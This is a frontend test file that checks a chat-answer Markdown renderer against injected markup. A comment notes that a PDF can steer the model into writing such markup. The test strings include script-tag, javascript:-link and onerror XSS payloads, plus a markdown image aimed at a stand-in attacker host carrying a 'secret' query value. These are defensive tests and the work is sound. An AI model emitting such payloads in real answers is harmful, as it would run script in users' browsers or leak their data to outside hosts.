import { afterEach, describe, expect, it } from "vitest";
import { cleanup, render } from "@testing-library/react";
import ChatMarkdown from "./ChatMarkdown";

afterEach(cleanup);

// The AI security pass (BreakingBreach checklist, core tests 09 and 10): an answer is shown as text. A PDF can tell
// the model to write markup; none of it may run, and nothing may load from a host the answer names.
describe("an answer can't run code or reach out", () => {
  it("raw HTML and javascript: links stay inert (core test 09)", () => {
    const { container } = render(<ChatMarkdown>{"Hi <script>window.__x = 1</script> [click](javascript:alert(1)) <img src=x onerror=alert(1)>"}</ChatMarkdown>);
    expect(container.querySelector("script")).toBeNull();
    expect(container.querySelector("a[href^='javascript']")).toBeNull();
    expect(container.querySelector("img")).toBeNull();
    expect((window as unknown as { __x?: number }).__x).toBeUndefined();
  });

  it("a markdown image is never loaded: its alt text shows instead (core test 10)", () => {
    const { container } = render(<ChatMarkdown>{"Look: ![your notes](https://evil.example.test/x.png?d=secret)"}</ChatMarkdown>);
    expect(container.querySelector("img")).toBeNull();
    expect(container.textContent).toContain("[image: your notes]");
    expect(container.innerHTML).not.toContain("evil.example.test");
  });

  it("ordinary web links still work, opened safely in a new tab; odd schemes become text", () => {
    const { container } = render(<ChatMarkdown>{"[Khan Academy](https://www.khanacademy.org) and [data](data:text/html,hi)"}</ChatMarkdown>);
    const links = [...container.querySelectorAll("a")];
    expect(links).toHaveLength(1);
    expect(links[0].getAttribute("rel")).toContain("noopener");
    expect(links[0].getAttribute("target")).toBe("_blank");
    expect(container.textContent).toContain("data");
  });
});
